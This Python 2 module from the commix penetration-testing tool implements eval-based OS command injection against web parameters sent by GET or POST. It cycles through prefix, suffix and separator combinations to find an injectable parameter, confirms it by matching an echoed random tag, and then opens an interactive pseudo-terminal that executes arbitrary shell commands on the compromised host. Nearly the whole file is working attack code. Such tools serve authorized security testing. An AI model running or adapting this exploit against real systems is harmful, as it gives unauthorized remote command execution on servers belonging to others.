#!/usr/bin/env python
# encoding: UTF-8

"""
 This file is part of commix tool.
 Copyright (c) 2015 Anastasios Stasinopoulos (@ancst).
 https://github.com/stasinopoulos/commix

 This program is free software: you can redistribute it and/or modify
 it under the terms of the GNU General Public License as published by
 the Free Software Foundation, either version 3 of the License, or
 (at your option) any later version.
 
 For more see the file 'readme/COPYING' for copying permission.
"""

import re
import sys
import time
import string
import random
import base64
import urllib
import urllib2

from src.utils import menu
from src.utils import colors
from src.utils import settings

from src.core.requests import headers
from src.core.requests import parameters

from src.core.injections.results_based.techniques.payloads import eval_payloads

"""
 The "eval-based" injection technique on Classic OS Command Injection.
"""

def exploitation(url,delay,filename,http_request_method):
  
  counter = 0
  vp_flag = True
  no_result = True
  injection_type = "Results-based Command Injection"
  technique = "eval-based injection technique"
    
  sys.stdout.write( colors.BOLD + "(*) Testing the "+ technique + "... " + colors.RESET)
  sys.stdout.flush()
  
  # Print the findings to log file.
  output_file = open(filename + ".txt", "a")
  output_file.write("\n---")
  output_file.write("\n(+) Type : " + injection_type)
  output_file.write("\n(+) Technique : " + technique.title())
  output_file.close()
  
  for prefix in settings.PREFIXES:
    for suffix in settings.SUFFIXES:
      for separator in settings.SEPARATORS:
	
	# Check for bad combination of prefix and separator
	combination = prefix + separator
	if combination in settings.JUNK_COMBINATION:
	  prefix = ""
		
	# Change TAG on every request to prevent false-positive resutls.
	TAG = ''.join(random.choice(string.ascii_uppercase) for i in range(6))  
	B64_ENC_TAG = base64.b64encode(TAG)
	B64_DEC_TRICK = settings.B64_DEC_TRICK

	# Check if defined "--base64" option.
	if menu.options.base64_trick == False:
	  B64_ENC_TAG = TAG
	  B64_DEC_TRICK = ""
	  
	try:
	  
	  # Eval-based decision payload (check if host is vulnerable).
	  payload = eval_payloads.decision(separator,TAG,B64_ENC_TAG,B64_DEC_TRICK)
	  
	  # Check if defined "--prefix" option.
	  if menu.options.prefix:
	    prefix = menu.options.prefix
	    payload = prefix + payload
	    
	  else:
	    #encoded_payload = encoded_prefix + payload
	    payload = prefix + payload
	    
	  # Check if defined "--suffix" option.
	  if menu.options.suffix:
	    suffix = menu.options.suffix
	    payload = payload + suffix
	    
	  else:
	    payload = payload + suffix
      
	  #payload = payload + ""+ B64_DEC_TRICK +""
	  payload = re.sub(" ", "%20", payload)
	  
	  # Check if defined "--verbose" option.
	  if menu.options.verbose:
	    if separator == ";":
	      sys.stdout.write("\n" + colors.GREY + payload + colors.RESET)
	      
	  # Check if defined method is GET (Default).
	  if http_request_method == "GET":
	    
	    # Check if its not specified the 'INJECT_HERE' tag
	    url = parameters.do_GET_check(url)
		  
	    # Define the vulnerable parameter
	    vuln_parameter = parameters.vuln_GET_param(url)
	    
	    target = re.sub(settings.INJECT_TAG, payload, url)
	    request = urllib2.Request(target)
	    
	    # Check if defined extra headers.
	    headers.do_check(request)
	      
	    # Check if defined any HTTP Proxy.
	    if menu.options.proxy:
	      try:
		proxy= urllib2.ProxyHandler({'http': menu.options.proxy})
		opener = urllib2.build_opener(proxy)
		urllib2.install_opener(opener)
		try:
		  response = urllib2.urlopen(request)
		  
		except urllib2.HTTPError, error:
		  response = error
		
	      except urllib2.HTTPError, err:
		print "\n(x) Error : " + str(err)
		sys.exit(1) 
	
	    else:
	      try:
		response = urllib2.urlopen(request)
		
	      except urllib2.HTTPError, error:
		response = error

	  else:
	      # Check if defined method is POST.
	      parameter = menu.options.data
	      parameter = urllib2.unquote(parameter)
	      
	      # Check if its not specified the 'INJECT_HERE' tag
	      parameter = parameters.do_POST_check(parameter)
	      
	      # Define the POST data
	      data = re.sub(settings.INJECT_TAG, payload, parameter)
	      request = urllib2.Request(url, data)

	      # Check if defined extra headers.
	      headers.do_check(request)
		      
	      # Define the vulnerable parameter
	      vuln_parameter = parameters.vuln_POST_param(parameter,url)

	      # Check if defined any HTTP Proxy.
	      if menu.options.proxy:
		try:
		  proxy= urllib2.ProxyHandler({'http': menu.options.proxy})
		  opener = urllib2.build_opener(proxy)
		  urllib2.install_opener(opener)
		  try:
		    response = urllib2.urlopen(request)
		    
		  except urllib2.HTTPError, error:
		    response = error
		  
		except urllib2.HTTPError, err:
		  print "\n(x) Error : " + str(err)
		  sys.exit(1) 
	  
	      else:
		try:
		  response = urllib2.urlopen(request)
		  
		except urllib2.HTTPError, error:
		  response = error
		  
	  # if need page reload
	  if menu.options.url_reload: 
	    time.sleep(delay)
	    response = urllib.urlopen(url)
	    
	  html_data = response.read()
	  html_data= re.sub("\n", "", html_data)

	  shell = re.findall(r""+TAG+TAG+TAG+"", html_data)

	except:
	  continue
	
	if shell:
	  found = True
	  no_result = False
	  if http_request_method == "GET":
	    
	    # Print the findings to log file
	    if vp_flag == True:
	      output_file = open(filename + ".txt", "a")
	      output_file.write("\n(+) Parameter : " + vuln_parameter + " (" + http_request_method + ")")
	      output_file.write("\n---\n")
	      vp_flag = False
	      output_file.close()
	      
	    counter = counter + 1
	    output_file = open(filename + ".txt", "a")
	    output_file.write("  ("+str(counter)+") Payload : "+ re.sub("%20", " ", payload) + "\n")
	    output_file.close()
	    
	    # Print the findings to terminal.
	    print colors.BOLD + "\n(!) The ("+ http_request_method + ") '" + vuln_parameter +"' parameter is vulnerable to "+ injection_type +"."+ colors.RESET
	    print "  (+) Type : "+ colors.YELLOW + colors.BOLD + injection_type + colors.RESET + ""
	    print "  (+) Technique : "+ colors.YELLOW + colors.BOLD + technique.title() + colors.RESET + ""
	    print "  (+) Parameter : "+ colors.YELLOW + colors.BOLD + vuln_parameter + colors.RESET + ""
	    print "  (+) Payload : "+ colors.YELLOW + colors.BOLD + re.sub("%20", " ", payload) + colors.RESET + "\n"
	    
	  else :

	    # Print the findings to log file
	    if vp_flag == True:
	      output_file = open(filename + ".txt", "a")
	      output_file.write("\n(+) Parameter : " + vuln_parameter + " (" + http_request_method + ")")
	      output_file.write("\n---\n")
	      vp_flag = False
	      output_file.close()
	      
	    counter = counter + 1
	    output_file = open(filename + ".txt", "a")
	    output_file.write("  ("+str(counter)+") Payload : "+ re.sub("%20", " ", payload) + "\n")
	    output_file.close()
	      
	    # Print the findings to terminal.
	    print colors.BOLD + "\n(!) The ("+ http_request_method + ") '" + vuln_parameter +"' parameter is vulnerable to "+ injection_type +"."+ colors.RESET
	    print "  (+) Type : "+ colors.YELLOW + colors.BOLD + injection_type + colors.RESET + ""
	    print "  (+) Technique : "+ colors.YELLOW + colors.BOLD + technique.title() + colors.RESET + ""
	    print "  (+) Parameter : "+ colors.YELLOW + colors.BOLD + vuln_parameter + colors.RESET + ""
	    print "  (+) Payload : "+ colors.YELLOW + colors.BOLD + re.sub("%20", " ", payload) + colors.RESET + "\n"
	    
	  gotshell = raw_input("(*) Do you want a Pseudo-Terminal shell? [Y/n] > ")
	  
	  if gotshell == "Y" or gotshell == "y":
	    print ""
	    print "Pseudo-Terminal (type 'q' or use <Ctrl-C> to quit)"
	    
	    while True:
	      try:
		cmd = raw_input("Shell > ")
		cmd = re.sub(" ","%20", cmd)
		
		if cmd == "q":
		  sys.exit(0)
		  
		else:
		  
		  # Execute shell commands on vulnerable host.
		  payload = eval_payloads.cmd_execution(separator,TAG,cmd)
		  
		  payload = re.sub(" ","%20", payload)

		  if menu.options.prefix:
		    prefix = menu.options.prefix
		    payload = prefix + payload
		    
		  else:
		    payload = prefix + payload
		    
		  # Check if defined "--suffix" option.
		  if menu.options.suffix:
		    suffix = menu.options.suffix
		    payload = payload + suffix
		    
		  else:
		    payload = payload + suffix
		      
		  # Check if defined "--verbose" option.
		  if menu.options.verbose:
		    sys.stdout.write("\n" + colors.GREY + payload + colors.RESET)
		    
		  # Check if defined method is GET (Default).
		  if http_request_method == "GET":
		    
		    # Check if its not specified the 'INJECT_HERE' tag
		    url = parameters.do_GET_check(url)
		    
		    target = re.sub(settings.INJECT_TAG, payload, url)
		    vuln_parameter = ''.join(vuln_parameter)
		    request = urllib2.Request(target)
		    
		    # Check if defined extra headers.
		    headers.do_check(request)
		      
		    # Check if defined any HTTP Proxy.
		    if menu.options.proxy:
		      try:
			proxy= urllib2.ProxyHandler({'http': menu.options.proxy})
			opener = urllib2.build_opener(proxy)
			urllib2.install_opener(opener)
			try:
			  response = urllib2.urlopen(request)
			  
			except urllib2.HTTPError, error:
			  response = error
			
		      except urllib2.HTTPError, err:
			print "\n(x) Error : " + str(err)
			sys.exit(1) 
		
		    else:
		      try:
			response = urllib2.urlopen(request)
			
		      except urllib2.HTTPError, error:
			response = error

		  else:
		    # Check if defined method is POST.
		    parameter = menu.options.data
		    parameter = urllib2.unquote(parameter)
		    
		    # Check if its not specified the 'INJECT_HERE' tag
		    parameter = parameters.do_POST_check(parameter)
		    
		    data = re.sub(settings.INJECT_TAG, payload, parameter)
		    request = urllib2.Request(url, data)
		    
		    # Check if defined extra headers.
		    headers.do_check(request)
		    
		    # Check if defined any HTTP Proxy.
		    if menu.options.proxy:
		      try:
			proxy= urllib2.ProxyHandler({'http': menu.options.proxy})
			opener = urllib2.build_opener(proxy)
			urllib2.install_opener(opener)
			try:
			  response = urllib2.urlopen(request)
			  
			except urllib2.HTTPError, error:
			  response = error
			
		      except urllib2.HTTPError, err:
			print "\n(x) Error : " + str(err)
			sys.exit(1) 
		
		    else:
		      try:
			response = urllib2.urlopen(request)
			
		      except urllib2.HTTPError, error:
			response = error
			
		  # if need page reload
		  if menu.options.url_reload:
		    time.sleep(delay)
		    response = urllib.urlopen(url)
		    
		  html_data = response.read()
		  html_data= re.sub("\n", " ", html_data)
		  
		  shell = re.findall(r""+TAG+TAG+"(.*)"+TAG+" "+TAG+"", html_data)
		  if shell:
		    shell = "".join(str(p) for p in shell).replace(" ", "", 1)
		    print "\n" + colors.GREEN + colors.BOLD + shell + colors.RESET + "\n"
		  
	      except KeyboardInterrupt: 
		print ""
		sys.exit(0)
	  
	  else:
	    print "(*) Continue testing the "+ technique +"... "
	    pass
	  
  if no_result == True:
    if menu.options.verbose == False:
      print "[" + colors.RED + " FAILED "+colors.RESET+"]"
      return False
  
    else:
      print ""
      return False
  
  else :
    print ""

